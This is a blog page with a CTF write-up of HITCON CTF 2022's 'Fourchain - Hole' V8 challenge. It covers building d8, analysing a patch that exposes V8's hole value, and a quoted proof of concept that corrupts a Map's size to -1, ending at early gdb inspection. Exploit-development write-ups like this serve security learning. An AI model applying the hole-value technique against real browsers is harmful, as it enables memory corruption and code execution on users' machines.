<!DOCTYPE html>
<html lang="en">
    <head><script src="/livereload.js?mindelay=10&amp;v=2&amp;port=1313&amp;path=livereload" data-no-instant defer></script>
        <meta charset="utf-8">
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <meta name="robots" content="noodp" />
        <title>HITCON CTF 2022 - Chovid99&#39;s Blog</title><meta name="Description" content="Security&#39;s blog made by Chovid99"><meta property="og:url" content="http://localhost:1313/posts/hitcon-ctf-2022/">
  <meta property="og:site_name" content="Chovid99&#39;s Blog">
  <meta property="og:title" content="HITCON CTF 2022">
  <meta property="og:description" content="Writeup for HITCON CTF 2022 by Chovid99">
  <meta property="og:locale" content="en">
  <meta property="og:type" content="article">
    <meta property="article:section" content="posts">
    <meta property="article:published_time" content="2022-11-27T21:06:10+07:00">
    <meta property="article:modified_time" content="2023-02-23T18:03:33+07:00">
    <meta property="article:tag" content="Writeup">
    <meta property="article:tag" content="HITCON">
    <meta property="article:tag" content="Pwn">
    <meta property="article:tag" content="Chrome">
    <meta property="article:tag" content="V8">
    <meta property="article:tag" content="JIT">
    <meta property="og:image" content="http://localhost:1313/C99-web-card.png">

  <meta name="twitter:card" content="summary_large_image">
  <meta name="twitter:image" content="http://localhost:1313/C99-web-card.png">
  <meta name="twitter:title" content="HITCON CTF 2022">
  <meta name="twitter:description" content="Writeup for HITCON CTF 2022 by Chovid99">
      <meta name="twitter:site" content="@Chovid99">
<meta name="application-name" content="Chovid99&#39;s Blog">
<meta name="apple-mobile-web-app-title" content="Chovid99&#39;s Blog"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="http://localhost:1313/posts/hitcon-ctf-2022/" /><link rel="prev" href="http://localhost:1313/posts/file-structure-attack-part-1/" /><link rel="next" href="http://localhost:1313/posts/stack-the-flags-ctf-2022/" /><link rel="stylesheet" href="/css/style.min.css"><link rel="preload" href="/lib/fontawesome-free/all.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/fontawesome-free/all.min.css"></noscript><link rel="preload" href="/lib/animate/animate.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'">
        <noscript><link rel="stylesheet" href="/lib/animate/animate.min.css"></noscript><meta name="google-site-verification" content="9bWYU2tJlhINPHANaxcXkK63aSnxvqj7GHrr_r5tb9s" /><script type="application/ld+json">
    {
        "@context": "http://schema.org",
        "@type": "BlogPosting",
        "headline": "HITCON CTF 2022",
        "inLanguage": "en",
        "mainEntityOfPage": {
            "@type": "WebPage",
            "@id": "http:\/\/localhost:1313\/posts\/hitcon-ctf-2022\/"
        },"image": ["http:\/\/localhost:1313\/C99-web-card.png"],"genre": "posts","keywords": "Writeup, HITCON, pwn, chrome, v8, JIT, browser, oob, 2022","wordcount":  4806 ,
        "url": "http:\/\/localhost:1313\/posts\/hitcon-ctf-2022\/","datePublished": "2022-11-27T21:06:10+07:00","dateModified": "2023-02-23T18:03:33+07:00","publisher": {
            "@type": "Organization",
            "name": "Chovid99","logo": "http:\/\/localhost:1313\/C99-Black3.png"},"author": {
                "@type": "Person",
                "name": "Author"
            },"description": ""
    }
    </script></head>
    <body data-header-desktop="fixed" data-header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('dark' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'dark' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>

        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
    <div class="header-wrapper">
        <div class="header-title">
            <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
            <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                
                
            </a>
        </div>
        <div class="menu">
            <div class="menu-inner"><a class="menu-item" href="/" title="Check my Home"> Home </a><a class="menu-item" href="/posts/" title="Check my posts"> Posts </a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags"> Tags </a><a class="menu-item" href="/about/" title="Know more about me"> About </a><span class="menu-item delimiter"></span></div>
        </div>
    </div>
</header><header class="mobile" id="header-mobile">
    <div class="header-container">
        <div class="header-wrapper">
            <div class="header-title">
                <a href="/" title="Chovid99&#39;s Blog">Chovid99&#39;s Blog</a>
                <a href="javascript:void(0);" class="menu-item theme-switch" title="Switch Theme">
                    <i class="fas fa-adjust fa-fw" aria-hidden="true"></i>
                </a>
            </div>
            <div class="menu-toggle" id="menu-toggle-mobile">
                <span></span><span></span><span></span>
            </div>
        </div>
        <div class="menu" id="menu-mobile"><a class="menu-item" href="/" title="Check my Home">Home</a><a class="menu-item" href="/posts/" title="Check my posts">Posts</a><a class="menu-item" href="/tags/" title="Check my posts&#39; tags">Tags</a><a class="menu-item" href="/about/" title="Know more about me">About</a></div>
    </div>
</header><main class="main">
                <div class="container"><div class="toc" id="toc-auto">
            <h2 class="toc-title">Contents</h2>
            <div class="toc-content" id="toc-content-auto"></div>
        </div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HITCON CTF 2022</h1><div class="post-meta">
            <div class="post-meta-line">
                </div>
            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw" aria-hidden="true"></i>&nbsp;<time datetime="Nov 27, 2022">Nov 27, 2022</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden="true"></i>&nbsp;4806 words&nbsp;
                <i class="far fa-clock fa-fw" aria-hidden="true"></i>&nbsp;23 minutes&nbsp;</div>
        </div><div class="details toc" id="toc-static"  data-kept="">
                <div class="details-summary toc-title">
                    <span>Contents</span>
                    <span><i class="details-icon fas fa-angle-right" aria-hidden="true"></i></span>
                </div>
                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
  <ul>
    <li><a href="#fourchain---hole">Fourchain - Hole</a>
      <ul>
        <li><a href="#initial-analysis">Initial Analysis</a>
          <ul>
            <li><a href="#prerequisite">Prerequisite</a></li>
            <li><a href="#environment-setup">Environment Setup</a></li>
            <li><a href="#analyze-the-patch">Analyze the patch</a></li>
            <li><a href="#searching-for-the-hole-value">Searching for the <code>hole</code> value</a></li>
          </ul>
        </li>
        <li><a href="#exploitation">Exploitation</a>
          <ul>
            <li><a href="#understanding-how-map-works">Understanding how Map works</a></li>
            <li><a href="#the-corrupted-maps-impact">The corrupted map&rsquo;s impact</a></li>
            <li><a href="#preparing-primitives">Preparing primitives</a>
              <ul>
                <li><a href="#creating-helpers">Creating helpers</a></li>
                <li><a href="#creating-addrof">Creating addrof</a></li>
                <li><a href="#creating-read">Creating Read</a></li>
                <li><a href="#creating-write">Creating Write</a></li>
              </ul>
            </li>
            <li><a href="#finding-a-way-to-control-the-rip">Finding a way to control the RIP</a></li>
            <li><a href="#final-step">Final Step</a></li>
          </ul>
        </li>
      </ul>
    </li>
    <li><a href="#social-media">Social Media</a></li>
  </ul>
</nav></div>
            </div><div class="content" id="content"><p><figure><a class="lightgallery" href="https://i.imgur.com/P0KH6Qp.png" title="https://i.imgur.com/P0KH6Qp.png" data-thumbnail="https://i.imgur.com/P0KH6Qp.png" data-sub-html="<h2>HITCON CTF 2022</h2>">
        <img
            class="lazyload"
            src="/svg/loading.min.svg"
            data-src="https://i.imgur.com/P0KH6Qp.png"
            data-srcset="https://i.imgur.com/P0KH6Qp.png, https://i.imgur.com/P0KH6Qp.png 1.5x, https://i.imgur.com/P0KH6Qp.png 2x"
            data-sizes="auto"
            alt="https://i.imgur.com/P0KH6Qp.png" />
    </a><figcaption class="image-caption">HITCON CTF 2022</figcaption>
    </figure>
During the weekends, I spent my time working on the HITCON CTF challenge called &ldquo;Fourchain - Hole&rdquo;. This is my first time doing a v8 browser pwn challenge, so I would like to apologize in advance if there is any mistake in my explanations and feel free to correct me if I&rsquo;m wrong.</p>
<h1 id="fourchain---hole">Fourchain - Hole</h1>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span><span class="lnt">6
</span><span class="lnt">7
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">There&#39;s a hole in the program ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Well I&#39;m sure it&#39;s not that of a big deal, after all it&#39;s just a small hole that won&#39;t do any damage right ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">... Right 😨 ?
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl">Author: bruce30262
</span></span></code></pre></td></tr></table>
</div>
</div><h2 id="initial-analysis">Initial Analysis</h2>
<p>This is a v8 browser challenge. We were given a zip consisting:</p>
<ul>
<li>The <code>d8</code> binary. This is a <code>v8</code> developer shell that can execute javascript code.</li>
<li><code>add_hole.patch</code>. This is the patch for the particular challenge.</li>
<li><code>README.txt</code>. This contains information about the args that the author specified during building the <code>d8</code> binary, the <code>commit hash</code> that we should use to build it (which is <code>63cb7fb817e60e5633fb622baf18c59da7a0a682</code>), and a hint that we should prepare our exploit in <code>Debian Linux 11.5</code>.</li>
</ul>
<h3 id="prerequisite">Prerequisite</h3>
<p>I highly recommend you read this <a href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/" target="_blank" rel="noopener noreffer ">great article</a> to gain some fundamentals on how <code>v8</code> works. But keep in mind that the article is already outdated because <code>v8</code> has changed some of their objects&rsquo; internal representation after the publication of that article.</p>
<h3 id="environment-setup">Environment Setup</h3>
<p>To start the challenge, we should prepare our environment first. Below is the summary of what I did to setup the environment (I followed the environment setup by Faraz&rsquo;s article):</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-gdscript3" data-lang="gdscript3"><span class="line"><span class="cl"><span class="c1"># Install depot_tools and put it in the PATH</span>
</span></span><span class="line"><span class="cl"><span class="n">git</span> <span class="n">clone</span> <span class="n">https</span><span class="p">:</span><span class="o">//</span><span class="n">chromium</span><span class="o">.</span><span class="n">googlesource</span><span class="o">.</span><span class="n">com</span><span class="o">/</span><span class="n">chromium</span><span class="o">/</span><span class="n">tools</span><span class="o">/</span><span class="n">depot_tools</span><span class="o">.</span><span class="n">git</span>
</span></span><span class="line"><span class="cl"><span class="n">echo</span> <span class="s2">&#34;export PATH=&lt;your_depot_tools_path&gt;:$PATH&#34;</span> <span class="o">&gt;&gt;</span> <span class="o">~/.</span><span class="n">zshrc</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1"># Prepare the needed files to build</span>
</span></span><span class="line"><span class="cl"><span class="n">fetch</span> <span class="n">v8</span>
</span></span><span class="line"><span class="cl"><span class="n">cd</span> <span class="n">v8</span>
</span></span><span class="line"><span class="cl"><span class="o">./</span><span class="n">build</span><span class="o">/</span><span class="n">install</span><span class="o">-</span><span class="n">build</span><span class="o">-</span><span class="n">deps</span><span class="o">.</span><span class="n">sh</span>
</span></span><span class="line"><span class="cl"><span class="n">git</span> <span class="n">checkout</span> <span class="o">&lt;</span><span class="n">commit_hash</span><span class="o">&gt;</span>
</span></span><span class="line"><span class="cl"><span class="n">gclient</span> <span class="n">sync</span>
</span></span><span class="line"><span class="cl"><span class="n">git</span> <span class="n">apply</span> <span class="n">add_hole</span><span class="o">.</span><span class="n">patch</span>
</span></span><span class="line"><span class="cl"><span class="o">./</span><span class="n">tools</span><span class="o">/</span><span class="n">dev</span><span class="o">/</span><span class="n">v8gen</span><span class="o">.</span><span class="n">py</span> <span class="n">x64</span><span class="o">.</span><span class="n">release</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>After executing the above script, there will be a file called <code>args.gn</code> inside the <code>out.gn/x64.release</code> folder. Add these lines to the file before building it to make our debugging life easier</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">symbol_level = 2
</span></span><span class="line"><span class="cl">v8_enable_object_print = true
</span></span></code></pre></td></tr></table>
</div>
</div><p>And then we will build it with the below command</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl"># Build it (It took me an hour to build it, so be patient)
</span></span><span class="line"><span class="cl">ninja -C ./out.gn/x64.release
</span></span></code></pre></td></tr></table>
</div>
</div><blockquote>
<p><strong>Additional Step:</strong> My <code>pwndbg</code> doesn&rsquo;t recognize the <code>job</code> command, which is very useful to debug the v8 shell later. After spending some quite time, turn out the solution is I need to add this LOC to my <code>.gdbinit</code> file: <code>source &lt;path_to_your_v8_folder&gt;/tools/gdbinit</code></p>
</blockquote>
<p>After we successfully build the <code>d8</code> binary, then we are ready to start the challenge.</p>
<h3 id="analyze-the-patch">Analyze the patch</h3>
<p>Let&rsquo;s check the patch file.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span><span class="lnt">11
</span><span class="lnt">12
</span><span class="lnt">13
</span><span class="lnt">14
</span><span class="lnt">15
</span><span class="lnt">16
</span><span class="lnt">17
</span><span class="lnt">18
</span><span class="lnt">19
</span><span class="lnt">20
</span><span class="lnt">21
</span><span class="lnt">22
</span><span class="lnt">23
</span><span class="lnt">24
</span><span class="lnt">25
</span><span class="lnt">26
</span><span class="lnt">27
</span><span class="lnt">28
</span><span class="lnt">29
</span><span class="lnt">30
</span><span class="lnt">31
</span><span class="lnt">32
</span><span class="lnt">33
</span><span class="lnt">34
</span><span class="lnt">35
</span><span class="lnt">36
</span><span class="lnt">37
</span><span class="lnt">38
</span><span class="lnt">39
</span><span class="lnt">40
</span><span class="lnt">41
</span><span class="lnt">42
</span><span class="lnt">43
</span><span class="lnt">44
</span><span class="lnt">45
</span><span class="lnt">46
</span><span class="lnt">47
</span><span class="lnt">48
</span><span class="lnt">49
</span><span class="lnt">50
</span><span class="lnt">51
</span><span class="lnt">52
</span><span class="lnt">53
</span><span class="lnt">54
</span><span class="lnt">55
</span><span class="lnt">56
</span><span class="lnt">57
</span><span class="lnt">58
</span><span class="lnt">59
</span><span class="lnt">60
</span><span class="lnt">61
</span><span class="lnt">62
</span><span class="lnt">63
</span><span class="lnt">64
</span><span class="lnt">65
</span><span class="lnt">66
</span><span class="lnt">67
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-diff" data-lang="diff"><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-array.cc b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 6e0cd408e7..aafdfb8544 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-array.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -395,6 +395,12 @@ BUILTIN(ArrayPush) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   return *isolate-&gt;factory()-&gt;NewNumberFromUint((new_length));
</span></span><span class="line"><span class="cl"> }
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"><span class="gi">+BUILTIN(ArrayHole){
</span></span></span><span class="line"><span class="cl"><span class="gi">+    uint32_t len = args.length();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    if(len &gt; 1) return ReadOnlyRoots(isolate).undefined_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+    return ReadOnlyRoots(isolate).the_hole_value();
</span></span></span><span class="line"><span class="cl"><span class="gi">+}
</span></span></span><span class="line"><span class="cl"><span class="gi">+
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> namespace {
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl"> V8_WARN_UNUSED_RESULT Object GenericArrayPop(Isolate* isolate,
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-collections-gen.cc b/src/builtins/builtins-collections-gen.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 78b0229011..55aaaa03df 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-collections-gen.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-collections-gen.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1763,7 +1763,7 @@ TF_BUILTIN(MapPrototypeDelete, CollectionsBuiltinsAssembler) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>                          &#34;Map.prototype.delete&#34;);
</span></span><span class="line"><span class="cl"> 
</span></span><span class="line"><span class="cl">   // This check breaks a known exploitation technique. See crbug.com/1263462
</span></span><span class="line"><span class="cl"><span class="gd">-  CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+  //CSA_CHECK(this, TaggedNotEqual(key, TheHoleConstant()));
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> 
</span></span><span class="line"><span class="cl">   const TNode&lt;OrderedHashMap&gt; table =
</span></span><span class="line"><span class="cl">       LoadObjectField&lt;OrderedHashMap&gt;(CAST(receiver), JSMap::kTableOffset);
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/builtins/builtins-definitions.h b/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gh">index 0e98586f7f..28a46f2856 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/builtins/builtins-definitions.h
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -413,6 +413,7 @@ namespace internal {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>   TFJ(ArrayPrototypeFlat, kDontAdaptArgumentsSentinel)                         \
</span></span><span class="line"><span class="cl">   /* https://tc39.github.io/proposal-flatMap/#sec-Array.prototype.flatMap */   \
</span></span><span class="line"><span class="cl">   TFJ(ArrayPrototypeFlatMap, kDontAdaptArgumentsSentinel)                      \
</span></span><span class="line"><span class="cl"><span class="gi">+  CPP(ArrayHole)                                                               \
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>                                                                                \
</span></span><span class="line"><span class="cl">   /* ArrayBuffer */                                                            \
</span></span><span class="line"><span class="cl">   /* ES #sec-arraybuffer-constructor */                                        \
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/compiler/typer.cc b/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 79bdfbddcf..c42ad4c789 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/compiler/typer.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1722,6 +1722,8 @@ Type Typer::Visitor::JSCallTyper(Type fun, Typer* t) {
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>       return Type::Receiver();
</span></span><span class="line"><span class="cl">     case Builtin::kArrayUnshift:
</span></span><span class="line"><span class="cl">       return t-&gt;cache_-&gt;kPositiveSafeInteger;
</span></span><span class="line"><span class="cl"><span class="gi">+    case Builtin::kArrayHole:
</span></span></span><span class="line"><span class="cl"><span class="gi">+      return Type::Oddball();
</span></span></span><span class="line"><span class="cl"><span class="gi"></span> 
</span></span><span class="line"><span class="cl">     // ArrayBuffer functions.
</span></span><span class="line"><span class="cl">     case Builtin::kArrayBufferIsView:
</span></span><span class="line"><span class="cl"><span class="gh">diff --git a/src/init/bootstrapper.cc b/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gh">index 9040e95202..a77333287a 100644
</span></span></span><span class="line"><span class="cl"><span class="gh"></span><span class="gd">--- a/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gd"></span><span class="gi">+++ b/src/init/bootstrapper.cc
</span></span></span><span class="line"><span class="cl"><span class="gi"></span><span class="gu">@@ -1800,6 +1800,7 @@ void Genesis::InitializeGlobal(Handle&lt;JSGlobalObject&gt; global_object,
</span></span></span><span class="line"><span class="cl"><span class="gu"></span>                           Builtin::kArrayPrototypeFindIndex, 1, false);
</span></span><span class="line"><span class="cl">     SimpleInstallFunction(isolate_, proto, &#34;lastIndexOf&#34;,
</span></span><span class="line"><span class="cl">                           Builtin::kArrayPrototypeLastIndexOf, 1, false);
</span></span><span class="line"><span class="cl"><span class="gi">+    SimpleInstallFunction(isolate_, proto, &#34;hole&#34;, Builtin::kArrayHole, 0, false);
</span></span></span><span class="line"><span class="cl"><span class="gi"></span>     SimpleInstallFunction(isolate_, proto, &#34;pop&#34;, Builtin::kArrayPrototypePop,
</span></span><span class="line"><span class="cl">                           0, false);
</span></span><span class="line"><span class="cl">     SimpleInstallFunction(isolate_, proto, &#34;push&#34;, Builtin::kArrayPrototypePush,
</span></span></code></pre></td></tr></table>
</div>
</div><p>After reading the patch, some interesting information:</p>
<ul>
<li>It introduces a new function called <code>hole</code> in an array. If we read the <code>BUILTIN(ArrayHole)</code> definition, the <code>hole</code> function:
<ul>
<li>Doesn&rsquo;t need any args</li>
<li>Will return a value from <code>the_hole_value()</code></li>
</ul>
</li>
<li>It disables a <code>CSA_CHECK</code>, which job is to make sure that the assigned key isn&rsquo;t <code>hole</code>, and also it has a link to <a href="crbug.com/1263462" rel="">crbug.com/1263462</a> which contains the exploitation related to the <code>hole</code> value. We will visit this site soon to gain some information on what is <code>hole</code> value.</li>
</ul>
<h3 id="searching-for-the-hole-value">Searching for the <code>hole</code> value</h3>
<p>I don&rsquo;t have any idea what is <code>hole</code> and why it is dangerous. So, I decided to read through the article that was mentioned in the patch first.</p>
<p>After reading through the <code>crbug</code> article, turns out <code>hole</code> is a constant defined in the <code>v8</code> source code. Due to special handling of the <code>hole</code> value in the javascript <code>Map</code> datatype, if we got a leak of the <code>hole</code> value and set it as one of the <code>Map</code> object keys, we can corrupt the <code>Map</code> length to <code>-1</code>, because somehow, we can call <code>Map.delete(hole)</code> twice, which leads to decrement the <code>Map</code> size by two for one key only. Below is the simple POC stated in the article:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">map</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">map</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">hole</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="c1">// Due to special handling of hole values, this ends up setting the size of the map to -1
</span></span></span><span class="line"><span class="cl"><span class="c1"></span><span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="nx">hole</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">map</span><span class="p">.</span><span class="k">delete</span><span class="p">(</span><span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl">
</span></span><span class="line"><span class="cl"><span class="c1">// Size is now -1
</span></span></span><span class="line"><span class="cl"><span class="c1">//print(map.size);
</span></span></span></code></pre></td></tr></table>
</div>
</div><p>Now that we know the bug introduced in the patch, we can move to the next step, which is trying to find a way to exploit this bug.</p>
<h2 id="exploitation">Exploitation</h2>
<p>Now, our first plan would be to recreate the simple POC created in the article locally and try to examine the memory layout after the corruption. But before that, we should gain some knowledge first on how <code>Map</code> is represented.</p>
<h3 id="understanding-how-map-works">Understanding how Map works</h3>
<p>First, let&rsquo;s prepare a js file called <code>poc.js</code>, which contains:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-javascript" data-lang="javascript"><span class="line"><span class="cl"><span class="kd">var</span> <span class="nx">c</span> <span class="o">=</span> <span class="p">[];</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Map</span><span class="p">();</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="mi">1</span><span class="p">,</span> <span class="mi">1</span><span class="p">);</span>
</span></span><span class="line"><span class="cl"><span class="nx">m</span><span class="p">.</span><span class="nx">set</span><span class="p">(</span><span class="nx">c</span><span class="p">.</span><span class="nx">hole</span><span class="p">(),</span> <span class="mi">1</span><span class="p">);</span>
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s start the <code>d8</code> via gdb. Don&rsquo;t forget to add <code>--allow-natives-syntax</code> so that we can use commands like <code>%DebugPrint</code> inside the <code>d8</code>, and <code>--shell</code> so that after executing our script, the interpreter will be still running, and we can continue to debug it.</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt">1
</span><span class="lnt">2
</span><span class="lnt">3
</span><span class="lnt">4
</span><span class="lnt">5
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">╰─❯ gdb d8
</span></span><span class="line"><span class="cl">GNU gdb (Ubuntu 12.1-0ubuntu1~22.04) 12.1
</span></span><span class="line"><span class="cl">Copyright (C) 2022 Free Software Foundation, Inc.
</span></span><span class="line"><span class="cl">...
</span></span><span class="line"><span class="cl">pwndbg&gt; run --allow-natives-syntax --shell ./poc.js
</span></span></code></pre></td></tr></table>
</div>
</div><p>Let&rsquo;s try to examine the memory layout. First, try to inspect the <code>m</code> object via <code>%DebugPrint</code>:</p>
<div class="highlight"><div class="chroma">
<table class="lntable"><tr><td class="lntd">
<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
</span><span class="lnt"> 2
</span><span class="lnt"> 3
</span><span class="lnt"> 4
</span><span class="lnt"> 5
</span><span class="lnt"> 6
</span><span class="lnt"> 7
</span><span class="lnt"> 8
</span><span class="lnt"> 9
</span><span class="lnt">10
</span></code></pre></td>
<td class="lntd">
<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="cl">V8 version 11.0.0 (candidate)
</span></span><span class="line"><span class="cl">d8&gt; %DebugPrint(m)
</span></span><span class="line"><span class="cl">DebugPrint: 0x3ba20005380d: [JSMap]
</span></span><span class="line"><span class="cl"> - map: 0x3ba2001862f1 &lt;Map[16](HOLEY_ELEMENTS)&gt; [FastProperties]
</span></span><span class="line"><span class="cl"> - prototype: 0x3ba200186431 &lt;Object map = 0x3ba200186319&gt;
</span></span><span class="line"><span class="cl"> - elements: 0x3ba200002259 &lt;FixedArray[0]&gt; [HOLEY_ELEMENTS]
</span></span><span class="line"><span class="cl"> - table: 0x3ba20005381d &lt;OrderedHashMap[17]&gt;
</span></span><span class="line"><span class="cl"> - properties: 0x3ba200002259 &lt;FixedArray[0]&gt;
</span></span><span class="line"><span class="cl"> - All own properties (excluding elements): {}
</span></span><span class="line"><span class="cl"> ...
</span></span></code></pre></td></tr></table>
</div>
